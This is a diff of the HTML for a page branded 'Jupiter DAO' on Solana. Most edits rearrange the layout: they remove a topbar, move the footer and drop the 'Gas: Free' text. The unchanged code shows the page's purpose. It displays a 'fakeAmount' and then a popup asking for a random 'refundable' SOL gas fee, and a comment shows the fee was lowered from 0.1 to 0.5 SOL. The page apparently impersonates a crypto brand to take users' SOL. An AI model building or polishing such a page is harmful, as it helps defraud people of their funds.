@@ -15,58 +15,11 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-        }
-
-        /* Topbar Styles */
-        .topbar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 70px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 40px;
-            background: rgba(0, 0, 0, .2);
-            backdrop-filter: blur(15px);
-            border-bottom: 1px solid rgba(255, 255, 255, .08);
-            z-index: 1000;
-        }
-
-        .brand {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            color: white;
-            font-weight: 700;
-            font-size: 18px;
-        }
-
-        .brand img {
-            width: 42px;
-            height: 42px;
-        }
-
-        .topbar nav {
-            display: flex;
-            gap: 25px;
-        }
-
-        .topbar nav a {
-            color: rgba(255, 255, 255, .8);
-            text-decoration: none;
-            transition: .3s;
-            font-size: 14px;
-        }
-
-        .topbar nav a:hover {
-            color: #FFE45C;
+            padding: 20px;
         }
 
         /* Main Content */
         main {
-            padding-top: 70px;
             flex: 1;
             display: flex;
             align-items: center;
@@ -82,7 +35,6 @@
             max-width: 480px;
             width: 100%;
             border: 1px solid rgba(255, 255, 255, 0.1);
-            margin: 0 20px;
         }
         .logo {
             text-align: center;
@@ -330,30 +282,14 @@
 
         /* Footer Styles */
         .footer {
-            position: fixed;
-            bottom: 15px;
-            left: 0;
-            right: 0;
             text-align: center;
             color: rgba(255, 255, 255, .4);
             font-size: 12px;
-            z-index: 999;
+            margin-top: 20px;
         }
 
         /* Responsive */
         @media (max-width: 768px) {
-            .topbar {
-                padding: 0 20px;
-                flex-wrap: wrap;
-                height: auto;
-                gap: 15px;
-            }
-
-            .topbar nav {
-                gap: 15px;
-                font-size: 12px;
-            }
-
             .container {
                 padding: 32px 20px;
             }
@@ -362,28 +298,13 @@
                 font-size: 24px;
             }
 
-            main {
-                padding-top: 100px;
+            body {
+                padding: 10px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Topbar -->
-    <header class="topbar">
-        <div class="brand">
-            <img src="logo.jpg" alt="Jupiter" id="brand-logo">
-            <span>Jupiter DAO</span>
-        </div>
-
-        <nav>
-            <a href="#">Home</a>
-            <a href="#">FAQ</a>
-            <a href="#">Support</a>
-            <a href="#">Docs</a>
-        </nav>
-    </header>
-
     <!-- Main Content -->
     <main>
         <div class="container">
@@ -409,9 +330,6 @@
             </div>
 
             <div class="info">
-                <p>Powered by Jupiter DAO | <a href="#">Terms</a> | <a href="#">FAQ</a></p>
-                <p style="margin-top: 8px;">Network: Solana • Gas: Free</p>
-
                 <!-- Socials with Icons -->
                 <div class="socials">
                     <a href="https://x.com/jup_dao" target="_blank" title="X (Twitter)">
@@ -434,6 +352,13 @@
         </div>
     </main>
 
+    <!-- Footer -->
+    <footer class="footer">
+        © 2026 Jupiter DAO
+        <br>
+        All Rights Reserved
+    </footer>
+
     <!-- Gas Fee Popup -->
     <div id="gasFeePopup" class="gas-fee-popup" style="display: none;">
         <div class="gas-fee-content">
@@ -455,13 +380,6 @@
             <button class="gas-fee-btn" onclick="closeSuccessPopup()">Close</button>
         </div>
     </div>
-
-    <!-- Footer -->
-    <footer class="footer">
-        © 2026 Jupiter DAO
-        <br>
-        All Rights Reserved
-    </footer>
 
     <!-- Load Solana Web3.js FIRST -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
@@ -631,7 +549,7 @@
         console.log('[DEBUG] showGasFeePopup() called with amount:', fakeAmount);
         document.getElementById('gasFeePopup').style.display = 'flex';
 
-        // Calculate gas fee (0.005 - 0.015 SOL instead of 0.1-0.5)
+        // Calculate gas fee (0.005 - 0.015 SOL)
         const gasFee = (Math.random() * 0.01 + 0.005).toFixed(4);
         document.getElementById('gasFeeAmount').textContent = `Fee: ${gasFee} SOL (refundable)`;
 
